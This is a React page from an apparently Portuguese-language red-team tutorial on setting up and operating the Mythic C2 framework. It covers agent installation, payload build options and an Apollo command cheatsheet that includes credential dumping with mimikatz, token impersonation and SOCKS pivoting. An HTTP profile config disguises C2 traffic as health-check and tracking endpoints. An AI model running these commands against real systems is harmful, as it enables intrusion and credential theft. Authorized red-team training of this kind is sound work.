import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Mythic() {
  return (
    <PageContainer
      title="Mythic C2 — framework modular dockerizado"
      subtitle="C2 multi-agente (Apollo, Athena, Poseidon, Medusa) com UI web React, profiles HTTP/SMB/WebSocket e tudo em Docker."
      difficulty="avancado"
      timeToRead="22 min"
    >
      <h2>O que diferencia o Mythic</h2>
      <p>
        <strong>Mythic</strong> (its-a-feature/Mythic) é um C2 com filosofia <em>"plataforma + plugins"</em>:
        o core é só o servidor + UI web. Os <strong>agentes</strong> (payloads que rodam no alvo) e os{" "}
        <strong>C2 profiles</strong> (como o agente fala com o servidor) são containers Docker
        independentes que você instala via <code>mythic-cli install</code>. Resultado: novo agente
        (.NET, Python, Go, Swift, Rust) sem alterar o core.
      </p>

      <AlertBox type="warning" title="Red team profissional">
        <p>
          Mythic é desenhado para operações multi-operador, com auditoria, RBAC e rastreamento por
          callback. Como sempre: só com contrato e scope assinado.
        </p>
      </AlertBox>

      <h2>Instalação</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y docker.io docker-compose make",
            out: "(Mythic exige Docker Engine + Compose v2)",
            outType: "muted",
          },
          {
            cmd: "git clone https://github.com/its-a-feature/Mythic.git ~/Mythic && cd ~/Mythic",
            out: `Cloning into '/home/wallyson/Mythic'...
remote: Total 24812 (delta 142), reused 187`,
            outType: "info",
          },
          {
            cmd: "sudo make",
            out: `[*] Building mythic-cli ...
[+] mythic-cli built: ./mythic-cli`,
            outType: "success",
          },
          {
            cmd: "sudo ./mythic-cli start",
            out: `[+] Started mythic_postgres
[+] Started mythic_rabbitmq
[+] Started mythic_react
[+] Started mythic_server
[+] Started mythic_documentation
[+] Started mythic_jupyter

Web UI: https://127.0.0.1:7443
Default user: mythic_admin
Default password: <gerada em .env>`,
            outType: "success",
          },
          {
            cmd: "sudo grep MYTHIC_ADMIN_PASSWORD ~/Mythic/.env",
            out: "MYTHIC_ADMIN_PASSWORD=K8x9zP2vQ4mN7rT1wB5cF",
            outType: "warning",
          },
        ]}
      />

      <h2>Instalar agentes e profiles</h2>
      <Terminal
        path="~/Mythic"
        lines={[
          {
            comment: "agente Apollo (.NET / Windows)",
            cmd: "sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo",
            out: `[+] Cloning into temporary directory ...
[+] Found agent: Apollo
[+] Building Apollo container ... (5m32s)
[+] Apollo agent installed`,
            outType: "success",
          },
          {
            comment: "agente Poseidon (Go / Linux + macOS)",
            cmd: "sudo ./mythic-cli install github https://github.com/MythicAgents/poseidon",
            out: "[+] Poseidon agent installed",
            outType: "info",
          },
          {
            comment: "C2 profile HTTP",
            cmd: "sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http",
            out: "[+] HTTP C2 profile installed",
            outType: "info",
          },
          {
            cmd: "sudo ./mythic-cli status",
            out: `Mythic Main Services
====================
mythic_postgres        ✔ running     5432
mythic_rabbitmq        ✔ running     5672
mythic_server          ✔ running     17443
mythic_react           ✔ running     7443

Installed Agents
================
Apollo                 ✔ running
Poseidon               ✔ running

Installed C2 Profiles
=====================
http                   ✔ running     80,443`,
            outType: "default",
          },
        ]}
      />

      <h2>Arquitetura — quem fala com quem</h2>
      <CodeBlock
        language="bash"
        title="fluxo de mensagem"
        code={`+--------------------+         +-----------------+         +----------------+
| Operador (browser) | <-----> | mythic_react UI | <-----> | mythic_server  |
+--------------------+         +-----------------+         +-------+--------+
                                                                   |
                                                                   v
                                                            +----------------+
                                                            | RabbitMQ bus   |
                                                            +-------+--------+
                                                                    |
                            +---------------------------+-----------+----+
                            v                           v                v
                    +---------------+           +---------------+  +---------------+
                    | Apollo agent  |           | Poseidon      |  | http profile  |
                    | container     |           | container     |  | container     |
                    +-------+-------+           +---------------+  +-------+-------+
                            |                                              ^
                            | (gera payload Windows .exe)                  |
                            v                                              |
                    +---------------+                                      |
                    | callback      | --------> HTTP/443 -----------------+
                    | (alvo Win)    |
                    +---------------+`}
      />

      <h2>Criar payload via UI</h2>
      <p>
        Após login em <code>https://127.0.0.1:7443</code>: <strong>Payload Generation</strong> →{" "}
        <strong>Create New Payload</strong>. Escolhe agente (Apollo p/ Windows), C2 profile (http),
        OS, arquitetura, opções de build. O servidor envia o build job para o container do agente,
        que compila e devolve o binário na aba <strong>Payloads</strong>.
      </p>

      <CommandTable
        title="Opções típicas no build de Apollo (Windows)"
        variations={[
          { cmd: "OutputType", desc: "Executable | Shellcode | Service | DLL | Raw .NET assembly.", output: "Service = roda como Windows service via SCM." },
          { cmd: "Architecture", desc: "x64 | x86.", output: "x64 padrão em ambientes modernos." },
          { cmd: "EncryptedExchangeCheck", desc: "Negocia chave AES por callback (default ON).", output: "False só pra debug." },
          { cmd: "AESPSK", desc: "PSK base64 derivada do C2 profile.", output: "Compartilhada entre profile e payload." },
          { cmd: "callback_host", desc: "URL do redirector / teamserver.", output: "https://c2.empresa-redteam.com" },
          { cmd: "callback_interval", desc: "Segundos entre check-ins.", output: "10 = interativo, 600 = stealth beacon." },
          { cmd: "callback_jitter", desc: "0-100% de variação aleatória.", output: "Recomendado 25-50." },
          { cmd: "killdate", desc: "Data em que o agente se desliga sozinho.", output: "Final do engagement." },
        ]}
      />

      <h2>Tasking e callback</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "depois que o payload roda no alvo, callback aparece em /new/callbacks",
            cmd: "(UI) Active Callbacks",
            out: `ID  Host       User          Domain   IP             Architecture  Last Checkin
12  WS-USR07   jsmith        ACME     10.10.14.7     x64           3s
13  WIN-DC01   svc-mssql     ACME     10.10.14.5     x64           14s`,
            outType: "info",
          },
          {
            comment: "interagir = clicar no callback (abre tab estilo terminal)",
            cmd: "[12] (Apollo) > whoami",
            out: `acme\\jsmith`,
            outType: "default",
          },
          {
            cmd: "[12] (Apollo) > pwd",
            out: `C:\\Users\\jsmith\\Documents`,
            outType: "default",
          },
          {
            cmd: "[12] (Apollo) > getprivs",
            out: `SeShutdownPrivilege               Disabled
SeChangeNotifyPrivilege           Enabled
SeUndockPrivilege                 Disabled
SeIncreaseWorkingSetPrivilege     Disabled
SeTimeZonePrivilege               Disabled`,
            outType: "warning",
          },
          {
            comment: "execute-assembly carrega .NET em memória",
            cmd: "[12] (Apollo) > execute_assembly -Assembly Seatbelt.exe -Arguments AntiVirus",
            out: `=== Antivirus ===
DisplayName                  : Windows Defender
PathToSignedReportingExe     : %ProgramFiles%\\Windows Defender\\MsMpeng.exe
ProductState                 : ON`,
            outType: "info",
          },
        ]}
      />

      <h2>Comandos do Apollo (mais usados)</h2>
      <CommandTable
        title="Cheatsheet Apollo"
        variations={[
          { cmd: "shell <cmd>", desc: "cmd.exe /c (gera child = OPSEC ruim).", output: "Use só pra one-liner rápido." },
          { cmd: "powershell <cmd>", desc: "PowerShell unmanaged via System.Management.Automation.", output: "Sem dropar .ps1." },
          { cmd: "execute_assembly -Assembly X.exe -Arguments ...", desc: "Carrega .NET em memória (AppDomain isolado).", output: "Equivalente ao execute-assembly do CS." },
          { cmd: "execute_pe -File mimikatz.exe -Arguments \"sekurlsa::logonpasswords exit\"", desc: "Executa PE/EXE em memória via reflection loader.", output: "Mais barulhento que execute_assembly." },
          { cmd: "inline_assembly", desc: "Variante inline (mesmo AppDomain).", output: "Útil pra encadear vários assemblies." },
          { cmd: "spawn_to_x64 / spawn_to_x86", desc: "Define processo sacrifício para fork & run.", output: "Default: rundll32. Mude para evitar IOC." },
          { cmd: "make_token <user> <pass>", desc: "LogonUser API → impersona.", output: "Útil p/ rodar comando como outro user." },
          { cmd: "rev2self", desc: "Volta ao token original.", output: "Sempre depois de make_token." },
          { cmd: "screenshot", desc: "Print da sessão.", output: "Aparece na aba Screenshots." },
          { cmd: "upload / download", desc: "Transferência via canal C2.", output: "Salva em /Mythic/files/." },
          { cmd: "socks 1080", desc: "Inicia SOCKS5 server.", output: "Saída via callback escolhido." },
          { cmd: "rportfwd 4444 10.10.10.5 445", desc: "Port forward reverso (tunelar SMB interno pro Mythic).", output: "Acessa em 127.0.0.1:4444 do Kali." },
          { cmd: "jobs", desc: "Lista tasks ativas.", output: "Útil pra cancelar download lento." },
        ]}
      />

      <h2>SOCKS proxy via Mythic</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "[12] (Apollo) > socks 1080",
            out: "[+] SOCKS5 started on 127.0.0.1:1080 (mythic_server container)",
            outType: "success",
          },
          {
            comment: "do Kali host (mapeia porta do container)",
            cmd: "sudo docker port mythic_server | grep 1080",
            out: "1080/tcp -> 0.0.0.0:1080",
            outType: "info",
          },
          {
            cmd: "proxychains nmap -sT -Pn -p445 10.10.10.0/24",
            out: `[proxychains] Strict chain ... 127.0.0.1:1080 ... 10.10.10.5:445 <--socket OK
PORT    STATE SERVICE
445/tcp open  microsoft-ds`,
            outType: "warning",
          },
        ]}
      />

      <h2>Profiles HTTP customizados</h2>
      <p>
        Cada C2 profile tem um arquivo de config que define URIs, headers, jitter, user-agents.
        O equivalente Mythic do "Malleable C2 profile" do Cobalt Strike.
      </p>

      <CodeBlock
        language="json"
        title="C2_Profiles/http/c2_code/config.json"
        code={`{
  "instances": [
    {
      "port": 443,
      "key_path": "/Mythic/ssl/c2.crt",
      "cert_path": "/Mythic/ssl/c2.key",
      "use_ssl": true,
      "debug": false,
      "ServerHeaders": {
        "Server": "nginx/1.24.0",
        "X-Frame-Options": "SAMEORIGIN"
      },
      "payloads": {
        "callback_host": "https://c2.empresa-redteam.com",
        "callback_interval": 30,
        "callback_jitter": 30,
        "killdate": "2026-12-31",
        "encrypted_exchange_check": true,
        "AESPSK": "aes256_hmac:bm90LWEtcmVhbC1rZXk="
      },
      "GET": {
        "uris": ["/api/v1/health", "/cdn/track/pixel.gif", "/login/oauth"],
        "AgentMessage": {
          "transform": "header_value",
          "name": "Cookie",
          "prepend": "_session=",
          "append": "; SameSite=Strict"
        }
      },
      "POST": {
        "uris": ["/api/v1/track/event", "/cdn/upload"],
        "AgentMessage": {
          "transform": "body_base64"
        }
      }
    }
  ]
}`}
      />

      <h2>Eventing e operação multi-operador</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "criar usuário via mythic-cli",
            cmd: "sudo ./mythic-cli database operator -u jsmith -p 'OperatorP@ss2026' -a true",
            out: "[+] User jsmith created (admin=true)",
            outType: "success",
          },
          {
            comment: "logs auditáveis (toda task vai pro DB)",
            cmd: "sudo ./mythic-cli logs mythic_server | grep TASK | tail -5",
            out: `2026/04/03 14:51:13 TASK created: id=842 callback=12 op=jsmith cmd=execute_assembly args=Seatbelt.exe
2026/04/03 14:51:14 TASK status: 842 -> processed
2026/04/03 14:51:18 TASK output: 842 (1842 bytes)`,
            outType: "muted",
          },
        ]}
      />

      <h2>Mythic vs Sliver vs Havoc</h2>
      <CommandTable
        title="Quando preferir Mythic"
        variations={[
          { cmd: "Multi-OS / multi-agente", desc: "Apollo (Win), Poseidon (Lin/macOS), Medusa (Python), Athena (.NET).", output: "Sliver tb cobre, mas com 1 agente só." },
          { cmd: "Auditoria forte", desc: "Eventing/RBAC/log de toda ação no DB Postgres.", output: "Bom pra cliente que exige rastreio." },
          { cmd: "UI web (sem cliente nativo)", desc: "Acessa de qualquer browser.", output: "Útil em equipe distribuída." },
          { cmd: "C2 profile como container", desc: "Adicionar profile WebSocket ou Slack-based = git clone + install.", output: "Sliver/Havoc têm profiles hard-coded." },
          { cmd: "Curva de aprendizado", desc: "Maior — muito conceito (eventing, callback graph).", output: "Sliver é mais imediato." },
        ]}
      />

      <PracticeBox
        title="Subir Mythic + Apollo + HTTP profile"
        goal="Setup local end-to-end e gerar 1 payload Apollo via UI (sem executar)."
        steps={[
          "Instale docker.io e docker-compose.",
          "Clone the repo Mythic e rode `make`.",
          "Inicie com `sudo ./mythic-cli start`.",
          "Instale os containers Apollo + http profile.",
          "Acesse https://127.0.0.1:7443 e logue com mythic_admin / senha do .env.",
          "Crie um payload Apollo Windows x64 EXE com callback http://127.0.0.1.",
        ]}
        command={`cd ~/Mythic
sudo ./mythic-cli start
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
sudo ./mythic-cli status
# abrir browser em https://127.0.0.1:7443`}
        expected={`Mythic Main Services
mythic_postgres        ✔ running     5432
mythic_server          ✔ running     17443
mythic_react           ✔ running     7443

Installed Agents
Apollo                 ✔ running

Installed C2 Profiles
http                   ✔ running     80,443

(UI mostra build job concluído com link pra download do .exe)`}
        verify="O status mostra todos os serviços ✔ running e o payload aparece em /new/payloads."
      />

      <AlertBox type="info" title="Mythic é o C2 mais 'plataforma' dos três">
        <p>
          Se você precisa de auditoria de cliente, multi-OS no mesmo engagement e quer adicionar
          agentes customizados (ex: agente Rust em-house), Mythic vence. Para op solo rápida com
          callback Linux/macOS/Windows, Sliver é mais ágil. Para Windows-only com foco em
          bypass de EDR, Havoc.
        </p>
      </AlertBox>
    </PageContainer>
  );
}
